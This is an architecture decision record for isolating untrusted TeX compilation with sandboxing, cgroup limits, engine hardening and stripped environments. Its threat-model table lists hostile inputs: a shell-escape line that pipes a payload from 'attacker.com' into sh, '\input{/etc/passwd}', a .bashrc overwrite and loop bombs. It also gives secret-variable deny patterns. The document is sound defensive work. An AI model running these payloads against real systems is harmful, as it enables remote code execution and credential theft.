# ADR-011 — Public Isolation Primitives and Untrusted TeX Compilation Architecture

**Status:** ACCEPTED  
**Date:** 2026-10-17  
**Context:** Requirement PL-07, CMP-01–CMP-12, and Sprint 15 (Gate 5) define the security and isolation architecture required before enabling untrusted compilation (`UNTRUSTED_COMPILE_ENABLED=true`) or public anonymous self-service registration (`PUBLIC_SIGNUP_ENABLED=true`). TeX engines (pdflatex, xelatex, lualatex) execute arbitrary Turing-complete macro expansions and have historically been vulnerable to arbitrary command execution via shell escapes (`\write18`), directory traversal via `\input` and `\openin`, network reconnaissance, and CPU/memory exhaustion attacks.

---

## 1. Threat Model & Adversarial Vectors

Untrusted LaTeX documents submitted to a shared collaborative platform represent hostile inputs that must be executed under adversarial assumptions:

| Attack Vector | Mechanism / Exploit | Security Impact |
|---|---|---|
| **Arbitrary Command Execution** | `\immediate\write18{curl attacker.com/payload \| sh}`, LuaTeX `os.execute()` | Full host takeover, shell breakout, remote code execution. |
| **Filesystem Traversal & Exfiltration** | `\input{/etc/passwd}`, `\openin0=/proc/version` | Leaking sensitive host configuration, credentials, or private project files. |
| **Arbitrary File Overwrite** | `\immediate\openout0=../../.bashrc` | Overwriting system binaries, persistence poisoning, cron tampering. |
| **Resource Exhaustion (CPU)** | `\loop \repeat`, recursive macro expansions (`\def\a{\a}\a`) | Infinite loops, CPU starvation, denial of service across tenant workloads. |
| **Resource Exhaustion (RAM/Disk)** | Memory bombs via dynamic token accumulation, gigabyte log file flooding | Out-of-memory kernel panics, disk space exhaustion. |
| **Process Fork Bomb** | Spawning sub-processes recursively | PID namespace exhaustion, process table starvation. |
| **Network Probing / SSRF** | Attempting internal HTTP connections to localhost (5432, 6379, 9000, 169.254.169.254) | Intranet port scanning, attacking PostgreSQL, Redis, or cloud metadata endpoints. |
| **Environment Variable Leakage** | Macro logging of `\getenv` or reading `/proc/self/environ` | Exfiltrating database passwords, Redis tokens, or S3/MinIO keys. |

---

## 2. Multi-Layer Defense-in-Depth Architecture

To contain all adversarial vectors, untrusted TeX execution enforces four independent defensive perimeters:

```
+-------------------------------------------------------------------------------+
|  Host OS / Node.js Job Worker / Docker Container Host                         |
|  [No database secrets, MinIO keys, or API tokens passed to compilation subproc] |
|                                                                               |
|   +-----------------------------------------------------------------------+   |
|   | 1. Container / Sandbox Boundary (bubblewrap / docker / unshare)       |   |
|   |    - Network: Disabled (`--net=none` / isolated network namespace)     |   |
|   |    - Mounts: Read-only root (/usr/share/texlive), tmpfs /tmp (100 MiB) |   |
|   |    - Capabilities: Drop ALL capabilities (`cap_drop=ALL`)             |   |
|   |    - Security: `no-new-privileges: true`, Seccomp profile              |   |
|   |                                                                       |   |
|   |   +---------------------------------------------------------------+   |   |
|   |   | 2. cgroup v2 Resource Ceilings                                |   |   |
|   |   |    - CPU: 100% of 1 core (quota: 100000us / period: 100000us)  |   |   |
|   |   |    - Memory: 512 MiB hard limit (OOM killer immediately kills) |   |   |
|   |   |    - Max PIDs: 64 processes/threads                           |   |   |
|   |   |    - Wall-clock timeout: 30 seconds strict deadline            |   |   |
|   |   |                                                               |   |   |
|   |   |   +-------------------------------------------------------+   |   |   |
|   |   |   | 3. Engine-Level Hardening (texmf.cnf / flags)          |   |   |   |
|   |   |   |    - `-no-shell-escape` enforced permanently           |   |   |   |
|   |   |   |    - `openout_any = p` (paranoid: no dotfiles/parents) |   |   |   |
|   |   |   |    - `openin_any = a` restricted to working directory  |   |   |   |
|   |   |   |    - `shell_escape = f` in texmf.cnf                   |   |   |   |
|   |   |   |                                                       |   |   |   |
|   |   |   |   +-----------------------------------------------+   |   |   |   |
|   |   |   |   | 4. Clean Isolated Workdir Execution           |   |   |   |   |
|   |   |   |   |    - Project files unpacked into isolated tmp |   |   |   |   |
|   |   |   |   |    - Stripped environment: zero cloud secrets |   |   |   |   |
|   |   |   |   |    - Only PATH, HOME, TMPDIR passed to binary |   |   |   |   |
|   |   |   |   |    - Output PDF captured; tmp directory wiped |   |   |   |   |
|   |   |   |   +-----------------------------------------------+   |   |   |   |
|   |   |   +-------------------------------------------------------+   |   |   |
|   |   +---------------------------------------------------------------+   |   |
|   +-----------------------------------------------------------------------+   |
+-------------------------------------------------------------------------------+
```

---

## 3. Policy Specification Matrix

### 3.1 Network Controls
- **Policy:** Network interface inside the compilation container is completely unmapped or loopback-only with no external route.
- **Verification:** Invocations of `curl`, socket calls, or LuaTeX `socket.http` fail immediately with network unreachable.

### 3.2 Filesystem Controls
- **System Mounts:** TeX Live distribution trees (`/usr/share/texlive`, `/var/lib/texmf`) mounted **strictly read-only (`ro`)**.
- **Working Directory:** Dedicated temporary directory (`tmpfs`) created per compile job with `mode=0700` owned by unprivileged runner UID `10001`. Maximum storage capacity capped at 100 MiB.
- **Cleanup:** Temporary working directory destroyed and securely removed immediately upon compilation termination (success, error, or timeout).

### 3.3 Process & Privilege Controls
- **User:** Non-root execution (`user: 10001:10001`).
- **Capabilities:** Every Linux capability dropped (`--cap-drop=ALL`).
- **Privilege Escalation:** `no-new-privileges: true` set to prevent setuid binary exploitation.
- **Seccomp:** Restricted system call whitelist blocking: `ptrace`, `bpf`, `mount`, `umount2`, `chroot`, `syslog`, `reboot`, `init_module`, `delete_module`, `process_vm_readv`, `process_vm_writev`.

### 3.4 Secret Hygiene & Isolation Invariant (PL-07)
- **Invariant:** Secrets used by API, PostgreSQL, Redis, Mailpit, or MinIO/S3 **MUST NEVER** be present in the execution environment of the compiler.
- **Sanitized Environment:** Compiler sub-processes receive an explicit, strict whitelist of environment variables:
  - `PATH=/usr/bin:/bin:/usr/local/bin`
  - `HOME=/tmp`
  - `TMPDIR=/tmp`
  - `TEXMFCNF=/etc/texmf`
  - `LC_ALL=C.UTF-8`
- Any variable matching `DATABASE_*`, `REDIS_*`, `MINIO_*`, `AWS_*`, `SECRET_*`, `KEY`, `TOKEN`, `PASSWORD` is strictly expunged before execution.

---

## 4. Operational Release Gate (G5 Alignment)

Untrusted public compilation (`UNTRUSTED_COMPILE_ENABLED=true`) and public registration (`PUBLIC_SIGNUP_ENABLED=true`) remain **disabled by default** (`false`) until:
1. S15-T13 isolated executor adapter is implemented and verified.
2. Adversarial test suite (S15-T02) passes 100% of attack test cases (shell escape, directory traversal, infinite loop, memory bomb).
3. Co-maintainer sign-off is recorded in `docs/test-reports/gate-g5-audit.md`.
